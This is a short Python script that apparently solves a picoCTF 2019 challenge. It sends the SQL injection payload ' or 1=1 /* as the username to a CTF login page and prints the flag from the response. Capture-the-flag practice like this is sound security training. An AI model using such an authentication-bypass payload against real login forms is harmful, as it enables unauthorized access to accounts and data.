from requests import *
from bs4 import BeautifulSoup

url = 'https://2019shell1.picoctf.com/problem/27383/login.php'
data = {
    'username' : "' or 1=1 /*",
    'password' : '123',
    'debug' : '0'
}

r = post(url , data=data)
soup = BeautifulSoup(r.text , 'html.parser')
flag = soup.find('p').get_text()
print(flag)
